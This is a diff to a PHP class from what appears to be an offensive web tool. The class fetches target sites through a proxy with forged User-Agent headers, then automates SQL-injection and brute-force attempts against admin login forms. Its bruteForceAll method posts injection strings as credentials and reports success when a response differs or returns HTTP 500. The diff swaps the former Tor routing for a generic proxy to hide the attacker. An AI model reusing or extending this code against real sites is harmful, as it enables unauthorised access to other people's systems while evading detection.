@@ -3,6 +3,8 @@
 namespace Aszone\Site;
 
 use GuzzleHttp\Client;
+use GuzzleHttp\Exception;
+use Aszone\FakeHeaders\FakeHeaders;
 use Respect\Validation\Validator as v;
 use Symfony\Component\DomCrawler\Crawler;
 
@@ -12,25 +14,29 @@ class Site{
 
 	public $tor;
 
-	public $optionTor;
+	public $proxy;
 
 	public $bodyTarget;
 
-	public function __construct($target)
+	public $header;
+
+	public function __construct($target,$proxy="")
 	{
-		$this->target	=$target;
-		$this->optionTor=array();
+		$this->header= new FakeHeaders();
+		$this->proxy	= $proxy;
+		$this->target	= $target;
 		try{
-			$client 		= new Client();
-			$this->bodyTarget= $client->get( $this->target,$this->optionTor)->getBody()->getContents();
+			$client 		 = new Client();
+			$this->bodyTarget= $client->get(
+				$this->target,
+				[
+					"proxy"=> $this->proxy,
+					'headers' => ['User-Agent' => $this->header->getUserAgent()],
+				])->getBody()->getContents();
 		}catch(\Exception $e){
-
 			echo $e->getCode()." - page not Found;";
-
 		}
-
 	}
-
 
 	public function isAdmin($body=false)
 	{
@@ -55,6 +61,14 @@ class Site{
 		return false;
 	}
 
+	/*public function setProxySiteList()
+	{
+		$proxySiteList=new ProxySiteList();
+		$proxy=$proxySiteList->getProxyOfSites();
+		var_dump($proxy);
+		exit();
+	}*/
+
 	public function getNameFieldUsername()
 	{
 		$resultNameField=false;
@@ -66,7 +80,6 @@ class Site{
 				$field[$node->attr('name')]=$node->attr('value');
 			}
 			if(isset($validNameField) AND !empty($validNameField))
-			//if($validNameField)
 			{
 				$resultNameField=$field;
 			}
@@ -108,9 +121,9 @@ class Site{
 		return $result;
 	}
 
-	public function bruteForceAll($action,$method,$username,$password,$otherFields)
+	public function bruteForceAll($action,$method,$username,$password,$otherFields=array())
 	{
-
+		//$proxySiteList=new ProxySiteList();
 		//echo "\n".$password;
 		$listForInjection=$this->listOfInjectionAdmin();
 		$pageControl="";
@@ -118,7 +131,6 @@ class Site{
 		$count0=0;
 		foreach($listForInjection as $keyInjetion=> $injetion)
 		{
-
 			echo $injetion;
 			echo "\n";
 			$username[key($username)]=$injetion;
@@ -129,10 +141,20 @@ class Site{
 					$password,
 				)
 			);
-			$dataToPost=['body'=>array_merge($username,$password,$otherFields)];
+
+			if( is_null($otherFields))
+			{
+				$fields=array_merge($username,$password);
+			}
+			else
+			{
+				$fields=array_merge($username,$password,$otherFields);
+			}
+
+			$dataToPost=['body'=>$fields];
 			$client 	= new Client(['defaults' => [
-				'headers' => ['User-Agent' => $this->setUserAgent()],
-				$this->optionTor,
+				'headers' => ['User-Agent' => $this->header->getUserAgent()],
+				'proxy'   => $this->proxy,
 				'timeout' => 30
 				]
 			]);
@@ -142,7 +164,7 @@ class Site{
 					$body = $client->post($action,$dataToPost)->getBody()->getContents();
 
 				}catch(\Exception $e){
-
+					//var_dump($e);
 					if($e->getCode()=="500"){
 						$sqlInjection=true;
 						$obs="is probably sql injection";
@@ -153,11 +175,9 @@ class Site{
 						$count0++;
 						if($count0==3)
 						{
-							$obs ="is probably break database";
-							$sqlInjection=true;
+							$obs ="is probably break system with force manny requisitions";
 						}
 						$sqlInjection=true;
-						//echo $e->getCode()." - page not Found;";
 					}
 					echo $e->getCode()." - page not Found;";
 
@@ -185,7 +205,6 @@ class Site{
 
 			if((isset($body) AND $pageControl!=$body) OR $sqlInjection)
 			{
-				//var_dump($pageControl);
 				echo "...sussefull...\n";
 				$resultData['username']=$injetion;
 				$resultData['password']=$injetion;
@@ -318,20 +337,6 @@ class Site{
 		return $injection;
 	}
 
-	private function setUserAgent()
-	{
-		$Browser = parse_ini_file(__DIR__ . "/../resource/UserAgent/Browser.ini");
-		$System = parse_ini_file(__DIR__ . "/../resource/UserAgent/System.ini");
-		$Locale = parse_ini_file(__DIR__ . "/../resource/UserAgent/Locale.ini");
-
-		$browser=$Browser[rand(0, count($Browser) - 1)];
-		$system=$System[rand(0, count($System) - 1)];
-		$locale=$Locale[rand(0, count($Locale) - 1)];
-
-		$browserFinal= $browser.'/'.rand(1, 20).'.'. rand(0, 20).' ('. $system. ' ' . rand(1, 7) . '.' . rand(0, 9) . '; ' . $locale . ';)';
-		//echo $browserFinal;
-		return $browserFinal;
-	}
 
 	private function sanitazeActionForm($action)
 	{
@@ -438,17 +443,5 @@ class Site{
 	}
 
 
-
-
-	public function setTor($tor)
-	{
-		if($tor){
-			$this->tor = $tor;
-			$this->optionTor=['proxy' => [
-				'http' => 'socks5://'.$this->tor['proxy'],
-				'https' => 'socks5://'.$this->tor['proxy']
-			]];
-		}
-	}
 	
 }
